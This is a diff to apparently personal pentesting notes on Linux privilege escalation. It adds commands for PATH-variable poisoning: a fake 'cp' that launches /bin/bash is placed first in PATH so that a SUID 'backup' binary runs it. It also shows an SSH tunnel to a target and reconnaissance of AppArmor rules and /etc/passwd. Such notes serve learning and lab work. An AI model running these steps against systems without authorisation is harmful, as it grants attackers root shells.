@@ -46,14 +46,25 @@ ssh -L 9001:127.0.0.1:9001 -i user_rsa user@TARGET_IP
 ### docker tricks
 ![](attachments/img-20251230144121.png)
 ### PATH variable poisoning
-
 [https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
+If binary with SUID bit you can execute is using some script you can add to PATH folder containing overwritten binary
 example backup script using command cp from PATH:
 ```bash
+# check what it is using:
+strings backup 
+# ex. create fake cp lib
 cd /tmp  
 echo "/bin/bash" > cp  
 chmod 777 cp  
+# add folder to PATH
 export PATH=/tmp:$PATH  
-cd secret/  
+# run binary which is using this cp command - it will use your crafted cp file
 ./backup
+```
+### useful: check apparmor rules and shell you are using. In some cases may be helpful:
+```
+# list files with rules:
+ls -la /etc/apparmor.d
+# check type of shell:
+cat /etc/passwd
 ```
